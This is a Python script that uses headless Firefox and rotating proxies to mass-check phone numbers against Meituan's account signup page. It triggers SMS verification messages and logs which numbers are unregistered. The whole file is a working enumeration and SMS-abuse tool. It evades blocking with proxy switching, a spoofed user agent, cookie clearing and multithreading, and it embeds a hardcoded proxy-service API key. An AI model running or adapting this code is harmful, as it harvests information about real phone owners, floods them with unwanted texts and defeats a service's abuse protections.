# -*- coding: utf-8 -*-

from selenium import webdriver
from multiprocessing.dummy import Pool as ThreadPool
import time
import re
import requests
import json
import random
# import sys

def verify_init(phone_list):
	phone_group = list_divide(phone_list,5)
	phone_error = list()
	print '[+] Setting config'
	profile = webdriver.FirefoxProfile()
	profile.set_preference('network.proxy.type',1)
	# profile.set_preference('browser.cache.disk.enable',False)
	# profile.set_preference('browser.cache.memory.enable',False)
	# profile.set_preference('privacy.trackingprotection.enabled',True)
	# profile.set_preference('network.cookie.cookieBehavior',2)
	# profile.set_preference("browser.cache.offline.enable", False)
	# profile.set_preference('security.ssl.enable_ocsp_stapling',False)
	# profile.set_preference('dom.ipc.plugins.enabled', False)
	# profile.set_preference('network.http.use-cache',False)
	profile.set_preference("general.useragent.site_specific_overrides",True)
	profile.set_preference("general.useragent.updates.enabled",True)
	profile.set_preference("general.useragent.override","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0")
	profile.update_preferences()
	options = webdriver.FirefoxOptions()
	options.add_argument('-headless')
	options.add_argument('--disable-gpu')
	driver = webdriver.Firefox(executable_path='geckodriver' , firefox_options=options , firefox_profile=profile)
	driver.set_page_load_timeout(20)
	print '[+] FireFox OK!'
	phone_error = verify_act(driver,phone_group)

	print '[+] Error Phone'
	phone_group = list_divide(phone_error,5)
	verify_act(driver,phone_group)

	driver.quit()


def verify_act(driver,phone_group):

	phone_error = list()
	global proxy_list
	for phone in phone_group:
		try:
			if proxy_list:
				proxy = proxy_list.pop()
				flag = test_proxy(proxy)
				while flag < 0:
					# print str(flag)
					proxy = proxy_list.pop()
					flag = test_proxy(proxy)
				ip = proxy.split(':')[0]
				port = proxy.split(':')[1]
				driver.get('about:config')
				script = '''
				var prefs = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefBranch);
				prefs.setCharPref("network.proxy.socks",{ip});
				prefs.setIntPref("network.proxy.socks_port",{port});'''.format(ip='"'+ip+'"' , port=port)
				driver.execute_script(script)
				print '[+] Switching proxy '+proxy
				time.sleep(1)
			
				try:
					for i in phone:
						driver.delete_all_cookies()
						driver.get('https://passport.meituan.com/account/unitivesignup')
						# print '[+] Verifying '+i
						mobile=driver.find_element_by_name('mobile')
						mobile.clear()
						mobile.send_keys(i)
						time.sleep(0.3)
						button = driver.find_element_by_css_selector("[class='btn-normal btn-mini verify-btn J-verify-btn']")
						button.click()
						time.sleep(0.3)
						button.click()
						time.sleep(1)

						pattern='<span class="f1 verify-tip.*>(.*?)</span>'
						res=re.findall(pattern,driver.page_source)
						if res[0]==u'已发送，1分钟后可重新获取。':
							data={i:"unregisted"}
							write(data)
							print data
						elif res[0]==u'该手机号已经注册，请直接登录或找回密码':
							data={i:"registed"}
							# write(data)
							# print data
						else:
							print res[0]
							phone_error.append(i)
							print len(phone_error)

						time.sleep(5)
						driver.delete_all_cookies()
					
				except Exception as e:
					print e
					for x in phone:
						phone_error.append(x)
					
			else:
				print '[+] Getting new proxy'
				proxy_list=get_proxy()
				for x in phone:
					phone_error.append(x)
		except:
			for x in phone:
				phone_error.append(x)
			proxy_list=get_proxy()
			
	return phone_error

def test_proxy(proxy):
	profile = webdriver.FirefoxProfile()
	profile.set_preference('network.proxy.type',1)
	profile.set_preference('browser.cache.disk.enable',False)
	# profile.set_preference('browser.cache.memory.enable',False)
	# profile.set_preference('privacy.trackingprotection.enabled',True)
	# profile.set_preference('network.cookie.cookieBehavior',2)
	# profile.set_preference("browser.cache.offline.enable", False)
	# profile.set_preference('security.ssl.enable_ocsp_stapling',False)
	profile.set_preference('dom.ipc.plugins.enabled', False)
	# profile.set_preference('network.http.use-cache',False)
	profile.set_preference("general.useragent.site_specific_overrides",True)
	profile.set_preference("general.useragent.updates.enabled",True)
	profile.set_preference("general.useragent.override","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0")
	profile.update_preferences()
	options = webdriver.FirefoxOptions()
	options.add_argument('-headless')
	options.add_argument('--disable-gpu')
	driver = webdriver.Firefox(executable_path='geckodriver' , firefox_options=options, firefox_profile=profile)
	ip = proxy.split(':')[0]
	port = proxy.split(':')[1]
	driver.get('about:config')
	script = '''
	var prefs = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefBranch);
	prefs.setCharPref("network.proxy.socks",{ip});
	prefs.setIntPref("network.proxy.socks_port",{port});'''.format(ip='"'+ip+'"' , port=port)
	driver.execute_script(script)
	time.sleep(1)
	try:
		driver.delete_all_cookies()
		driver.get('https://passport.meituan.com/account/unitivesignup')
		if '403 Forbidden' not in driver.page_source:
			driver.quit()
			return 1
		else:
			driver.quit()
			return -1
	except:
		driver.quit()
		return -2

def list_divide(listTemp, n):
	for i in range(0, len(listTemp), n):
		yield listTemp[i:i + n]

def get_proxy():
	url='http://webapi.http.zhimacangku.com/getip?big_num=2000&type=1&pro=&city=0&yys=0&port=2&pack=52336&ts=0&ys=0&cs=0&lb=3&sb=0&pb=45&mr=2&regions='
	req=requests.get(url)
	proxy_list1=req.content.split()
	if  len(proxy_list1) < 150:
		print '[+] Adding white list'
		add_white_list()
		req=requests.get(url)
		proxy_list1=req.content.split()
	return proxy_list1

def add_white_list():
	try:
		get_ip_url='http://webapi.http.zhimacangku.com/getip?num=200&type=1&pro=&city=0&yys=0&port=2&pack=52336&ts=0&ys=0&cs=0&lb=3&sb=0&pb=45&mr=2&regions='
		res=requests.get(get_ip_url)
		s=json.loads(res.content)
		ip_pattern='[0-9].*[0-9]'
		my_ip=re.findall(ip_pattern, s['msg'])[0]
		set_white_list_url='http://web.http.cnapi.cc/index/index/save_white?neek=69230&appkey=eaef9352fb85ccd3a576d139a4f83d8a&white='+my_ip
		r=requests.get(set_white_list_url)
		print '[+] Add white list success!'
	except:
		pass

def write(data):
	with open('result.json','a+') as f:
		json.dump(data,f)

def get_phone(file):
	f=open(file,'r')
	phone_list=f.readlines()
	f.close()
	x=list()
	for i in phone_list:
		x.append(i.replace('\n','').replace('\r',''))
	return x

def main():
	
	file = './phone1.txt'#sys.argv[1]
	num = 100
	thread_num = 16

	phone_list = get_phone(file)
	random.shuffle(phone_list)
	phone_divide = list_divide(phone_list,num)
	print '[+] Read Phone OK!'
	global proxy_list
	proxy_list=get_proxy()

	pool = ThreadPool(processes = thread_num)
	pool.map(verify_init,phone_divide)
	pool.close()
	pool.join()

if __name__ == '__main__':
	main()
	proxy_list=list()